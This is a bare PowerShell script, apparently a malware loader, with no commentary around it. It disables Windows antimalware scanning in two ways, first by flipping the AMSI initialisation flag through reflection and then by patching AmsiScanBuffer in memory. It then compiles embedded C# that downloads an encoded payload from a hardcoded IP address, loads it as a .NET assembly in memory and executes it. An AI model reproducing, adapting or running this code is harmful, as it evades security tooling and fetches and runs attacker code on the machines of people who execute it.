function retac
{
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
}
function mosder
{
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
}
function grtzol
{
$code = @"
using System.Net;
using System.Reflection;
using System;
using System.Threading;
namespace Nyan
{
    public class Cat
    {
        public static string BoUaI12WaY(string s)
        {
            char[] array = new char[s.Length];
            int forward = 0;
            for (int i = s.Length - 1; i >= 0; i--)
            {
                array[forward++] = s[i];
            }
            return new string(array);
        }
    
        public void Run()
        {
            using (WebClient wc = new WebClient())
            {
               // new Thread(() =>
              //  {
                    try
                    {
                        Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(BoUaI12WaY(wc.DownloadString("http://3.8.126.182/minom.txt"))));
                        MethodInfo methodInfo = assembly.EntryPoint;
                        object obj = assembly.CreateInstance(methodInfo.Name);
                        object[] parameters = new object[1];  // C#
                        if (methodInfo.GetParameters().Length == 0)
                        {
                            parameters = null; // VB.NET
                        }
                        methodInfo.Invoke(obj, parameters);
                    }
                    catch { return; }
              //  })
              //  { IsBackground = false }.Start();
            }
        }
    }
}
"@

Add-Type -TypeDefinition $code;
$instance = New-Object Nyan.Cat;
$instance.Run();

}
retac
mosder
grtzol
